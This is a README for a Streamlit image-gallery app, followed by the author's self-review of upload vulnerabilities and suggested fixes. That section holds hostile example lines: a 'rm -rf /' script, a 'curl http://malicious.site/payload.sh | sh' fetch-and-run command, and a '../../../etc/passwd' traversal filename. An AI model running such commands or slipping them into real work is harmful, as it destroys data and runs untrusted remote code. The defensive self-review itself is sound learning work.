# Digital Canvas

Digital Canvas is a Streamlit application that allows users to upload, manage, and view images in a digital gallery. It provides features for folder management, image sorting, and aesthtic interface, also when uploaded an image they it outputs confetti which gives visual feedback to the user.

## Features

- Upload images in JPG, JPEG, and PNG formats.
- Organize images into folders which is completed up to the user.
- View images in a gallery with sorting options.
- Manage folders and view folder statistics.

## Installation

To run this application, you need to have Python installed on your system. Follow the steps below to set up the application:

1. Install the required packages:

   pip install -r requirements.txt

2. Run the application:

   streamlit run imageapp.py

## If I was hired as a Penetration Tester.

I feel that as a future penetration tester it would be unlike me to not test my application to find vulnerabilities so here are some which I found:

Firstly, considering this application is a file uploader we can test for sanitisation checks for uploaded files, looking at the code:
uploaded_files = st.file_uploader("Drop images here", 
                                  type=["jpg", "jpeg", "png"], 
                                  accept_multiple_files=True)
we see that the code allows file uploads without proper validation of file contet, this makes it possible for attacker to upload malcious 
files (e.g script disguised as images) to execute arbitrary code on the server.
Here is a suggestion to fix this:
We can use the dependency Pillow to validate the file content type and size, this will ensure that only valid image files are accepted and that
it's an actual image.

from PIL import Image, UnidentifiedImageError

for uploaded_file in uploaded_files:
    try:
        img = Image.open(uploaded_file)
        img.verify()  # Verify the file is a valid image
        img.close()
    except UnidentifiedImageError:
        st.error(f"Invalid image file: {uploaded_file.name}")
        continue

Second vulnerability which I found is an arbitrary file upload, this is a common vulnerability in file uploaders where an attacker can upload a file to the server without any validation. this is within this code example:

filename = f"{timestamp}_{image_file.name}"
filepath = os.path.join(folder_path, filename)

An attacker could upload a file named ../../../etc/passwd to overwrite or access the system password file and more. 
We can fix this by using ensuring file paths resolve to within a designated upload directory, for example:

base_dir = os.path.abspath("uploads")
filepath = os.path.abspath(os.path.join(base_dir, sanitized_name))
if not filepath.startswith(base_dir):
    raise ValueError("Invalid file path!")

or, we can strip special characters form file names:

import re
sanitized_name = re.sub(r'[^\w\-.]', '_', uploaded_file.name)

another way which we can mitigate this vulnerability is by generating unique file names by using hashed or timestamped file names to prevent directory 
traversal.

Third vulnerability is server-side file execution.
If uploaded files are saved with eceutable permissions which they are as when you upload an image it is saved in the uploads folder, attackers can uplaod malicious scripts and execute them on the server giving the attacker full control over the system or network, for example:

this can be saved as a script.sh 
#!/bin/bash
rm -rf /
when this file is uploaded and executed it could delete all files on the server. Additionally, you can also make a malicious site in which 
you can make the the uploaded and executable file curl to a malicious site and execute the script, for example:
curl http://malicious.site/payload.sh | sh

To fix this we can set the file permissions to be non-executable or set the file permissions to be read-only, for example:
chmod 600 uploads/*

or disallow script execution 
<Directory "/var/www/uploads">
    Options -ExecCGI
</Directory>
